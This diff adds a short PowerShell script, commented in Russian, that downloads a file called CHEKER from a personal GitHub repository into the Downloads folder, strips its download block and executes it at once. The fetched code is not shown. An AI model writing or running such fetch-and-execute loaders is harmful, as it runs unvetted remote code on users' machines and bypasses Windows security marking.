@@ -1,1 +1,16 @@
+$url = 'https://raw.githubusercontent.com/FREAKMANCHIK/WORK/main/CHEKER'
+$outputPath = "$env:USERPROFILE\Downloads\CHEKER.ps1"
 
+try {
+    # Загружаем файл с использованием Invoke-RestMethod
+    Invoke-RestMethod -Uri $url -OutFile $outputPath
+
+    Write-Host "Файл успешно сохранён в папке загрузок ($outputPath)."
+    
+    # Если требуется сразу запустить скачанный файл, разблокируем и выполняем его
+    Unblock-File -Path $outputPath
+    Invoke-Expression "& '$outputPath'"
+}
+catch {
+    Write-Error "Ошибка загрузки файла: $_"
+}
